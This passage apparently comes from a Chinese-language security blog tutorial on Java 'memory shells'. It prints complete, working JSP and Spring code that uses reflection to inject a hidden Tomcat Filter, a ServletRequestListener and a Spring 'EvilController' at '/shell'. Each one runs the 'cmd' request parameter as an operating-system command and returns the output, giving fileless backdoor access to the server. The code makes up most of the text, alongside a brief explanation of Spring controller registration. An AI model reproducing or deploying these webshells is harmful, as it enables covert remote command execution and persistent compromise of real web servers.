class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// request是RequestFacade的类对象，servletContext是ApplicationContextFacade的类对象</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ApplicationContextFacade类有一个context的私有属性，其类型为ApplicationContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">servletContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    servletContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) servletContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ApplicationContext类也有一个context的私有属性，其类型为TomcatEmbeddedContext类，而这个类正是StandardContext类的子类</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) applicationContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;standardContext = &quot;</span> + standardContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">// --------------------下面开始是关键------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 standardContext 的 config 字段,这个字段是 Map&lt;String, ApplicationFilterConfig&gt; 类型的。</span></span><br><span class="line">    <span class="comment">// filterConfigs的key是filter的名称，value是filter的实例内容</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;justdoit&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="comment">//这里写上我们后门的主要代码</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (cmd == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> res.getWriter();</span><br><span class="line">                out.println(output);</span><br><span class="line">                out.flush();</span><br><span class="line">                out.close();</span><br><span class="line">                <span class="comment">//别忘记带这个，不然的话其他的过滤器可能无法使用</span></span><br><span class="line">                filterChain.doFilter(req, res);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将我们创建好的Filter封装到FilterDef中</span></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将filterDef注册到standardContext的filterDefs中</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        <span class="comment">//拦截的路由规则，/* 表示拦截任意路由</span></span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将filterMap注册到standardContext.filterMaps中</span></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据前面的filterDef和standardContext创建一个ApplicationFilterConfig对象</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将filterConfig注册到standardContext.filterConfigs中</span></span><br><span class="line">        filterConfigs.put(name, filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;注入成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p><code>Servlet</code> 提供了很多种 <code>Listener</code> 。最常用有以下几个：</p><ul><li><code>HttpSessionListener</code> ：<br>监听 <code>HttpSession</code> 的创建和销毁事件；</li><li><code>ServletRequestListener</code> ：<br>监听 <code>ServletRequest</code> 请求的创建和销毁事件；</li><li><code>ServletRequestAttributeListener</code> ：<br>监听 <code>ServletRequest</code> 请求的属性变化事件（即调用<code>ServletRequest.setAttribute()</code> 方法）；</li><li><code>ServletContextListener</code> ：<br>监听 <code>ServeltContext</code> 的创建和销毁事件。</li><li><code>ServletContextAttributeListener</code> ：<br>监听 <code>ServletContext</code> 的属性变化事件（即调用<code>ServletContext.setAttribute()</code> 方法）；</li></ul><p>很容易想到，这里动态注册 <code>Listener</code> 内存马肯定要用的就是 <code>ServletRequestListener</code> 。</p><h4 id="具体如何动态注册Listener代码"><a href="#具体如何动态注册Listener代码" class="headerlink" title="具体如何动态注册Listener代码"></a>具体如何动态注册Listener代码</h4><p>动态注册 <code>Listener</code> 相比 <code>Filter</code> 就简单了很多，只需要自定义好 <code>Listener</code> ，然后就可以直接通过 <code>standardContext#addApplicationEventListener()</code> 方法添加 <code>Listener</code> 了。 </p><p>下面直接给出代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// request是RequestFacade的类对象，servletContext是ApplicationContextFacade的类对象</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ApplicationContextFacade类有一个context的私有属性，其类型为ApplicationContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">servletContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    servletContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) servletContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ApplicationContext类也有一个context的私有属性，其类型为TomcatEmbeddedContext类，而这个类正是StandardContext类的子类</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) applicationContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;standardContext = &quot;</span> + standardContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// --------------------下面开始是关键------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                out = response.getWriter();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            out.println(output);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    standardContext.addApplicationEventListener(listener);</span><br><span class="line">    response.getWriter().write(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="框架组件"><a href="#框架组件" class="headerlink" title="框架组件"></a>框架组件</h2><p>前面是分析如何通过动态添加 <code>Servlet</code> 组件来实现内存马，下面接着分析如何通过动态添加框架的组件来实现内存马。</p><p>这里说到的框架有很多，<code>Spring</code>、<code>SpringBoot</code>、<code>Weblogic</code> 等。</p><p>这边主要说下 <code>SpringBoot</code> 框架的组件内存马的实现：动态注册 <code>Controller</code> 来实现内存马：</p><p><code>SpringBoot</code> 在处理请求的时候的主要逻辑是在 <code>Controller</code> 中进行的，所以我们可以代码层次注册一个<code>Controller</code> 来实现内存马。</p><h3 id="SpringBoot的Controller"><a href="#SpringBoot的Controller" class="headerlink" title="SpringBoot的Controller"></a>SpringBoot的Controller</h3><p>这里先分析一下 <code>SpringBoot</code> 的 <code>Controller</code> 是如何注册的。</p><h4 id="Spring中Controller注册涉及到的类"><a href="#Spring中Controller注册涉及到的类" class="headerlink" title="Spring中Controller注册涉及到的类"></a>Spring中Controller注册涉及到的类</h4><p><code>Spring</code> 注册 <code>Controller</code> 主要是通过 <code>AbstractHandlerMethodMapping#registerMapping())</code> 方法（也可以是 <code>registerHandlerMethod()</code> 方法，两者接收的参数相同，最终走向也相同）来注册的。这个方法需要 <code>handler</code> 参数（也就是 <code>controller</code> 所在的类），<code>method</code> 参数（ <code>controller</code> 类的哪个方法定义为 <code>controller</code> ，在这里这个就是内存马所定义在的位置），<code>mapping</code> 参数（ 有关于 <code>controller</code> 的匹配路径信息）。</p><p><img src="/imgs/1694443059747.png"></p><p><img src="/imgs/1694444066832.png"></p><p><img src="/imgs/1694444142751.png"></p><p>在这两个方法中，注册 <code>Controller</code> 又都交给了 <code>AbstractHandlerMethodMapping</code> 的内部类 <code>MappingRegistry</code> 的 <code>register()</code> 方法来处理。</p><p><img src="/imgs/1694443083571.png"></p><p><img src="/imgs/1694443109368.png"></p><p>可以分析 <code>Controller</code> 的信息都存放在 <code>AbstractHandlerMethodMapping#MappingRegistry</code> 的 <code>register</code> 属性当中。</p><p><img src="/imgs/1694443278608.png"></p><p><code>register</code> 属性是一个 <code>map</code> ，<code>key</code> 为 <code>RequestMappingInfo</code> 的对象，主要存放关于 <code>Controller</code> 的映射路径信息，<code>value</code> 为 <code>AbstractHandlerMethodMapping$MappingRegistration</code> 的对象，主要存放每个 <code>Controller</code> 的具体操作。</p><p><img src="/imgs/1694443579489.png"></p><blockquote><p>总结：从上面的分析中，我们可以得知动态注册一个 <code>controller</code> 的步骤是：</p><ol><li>注册一个 <code>RequestMappingInfo</code> 的对象，用来定义 <code>controller</code> 的如何生效。</li><li>注册一个 <code>controller</code> 类，在其中定义具体的 <code>controller</code> 接收一个请求的具体处理方法。</li><li>将上面注册好的信息传入 <code>AbstractHandlerMethodMapping#registerMapping()</code> 方法中。</li></ol></blockquote><p>具体如何获取 <code>Spring</code> 中的 <code>AbstractHandlerMethodMapping</code> ，从而能让它帮我们动态注册 <code>controller</code> ，我们直接看后面的代码就知道了。</p><h4 id="低版本Spring动态注册Controller的代码"><a href="#低版本Spring动态注册Controller的代码" class="headerlink" title="低版本Spring动态注册Controller的代码"></a>低版本Spring动态注册Controller的代码</h4><blockquote><p>下面的代码适用于 <code>Spring-5.3.2</code> 以下，对应 <code>SpringBoot-2.6</code> 以下。<code>SpringBoot-2.6</code> 以后<code>RequestMappingInfo</code> 的初始化构造发生了一些变化，否则会失败。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo03Controller</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/demo01&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">demo01</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="comment">// 获取Context</span></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.</span><br><span class="line">                currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射获得恶意类的test方法(根据test方法是否带了参数来选择用下面两个哪个)</span></span><br><span class="line">        <span class="comment">//Method method = EvilController.class.getMethod(&quot;test&quot;);</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> EvilController.class.getMethod(<span class="string">&quot;test&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 定义该controller的path</span></span><br><span class="line">        <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/shell&quot;</span>);</span><br><span class="line">        <span class="comment">// 定义允许访问的HTTP方法</span></span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="comment">// 构造注册信息</span></span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, ms, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 创建用于处理请求的对象，避免无限循环使用一个构造方法</span></span><br><span class="line">        <span class="type">EvilController</span> <span class="variable">injectToController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilController</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        <span class="comment">// 将该controller注册到Spring容器</span></span><br><span class="line">        mappingHandlerMapping.registerMapping(info, injectToController, method);</span><br><span class="line">        response.getWriter().println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EvilController</span><span class="params">(String xxx)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//这里test方法也可以不需要request，response参数，直接通过下面的静态方式获取</span></span><br><span class="line"><span class="comment">//            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span></span><br><span class="line"><span class="comment">//            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span></span><br><span class="line">            <span class="comment">// 获取cmd参数并执行命令</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (command != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    java.io.<span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ProcessBuilder p;</span><br><span class="line">                    <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        p = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                    java.util.<span class="type">Scanner</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    o = c.hasNext() ? c.next() : o;</span><br><span class="line">                    c.close();</span><br><span class="line">                    printWriter.write(o);</span><br><span class="line">                    printWriter.flush();</span><br><span class="line">                    printWriter.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 <code>RequestMappingHandlerMapping</code> 是 <code>AbstractHandlerMethodMapping</code> 抽象类的子类，而 <code>Spring</code> 的 <code>RequestMappingHandlerMapping</code> 可以通过 <code>RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</code> 获取 <code>Spring</code> 的 <code>context</code> 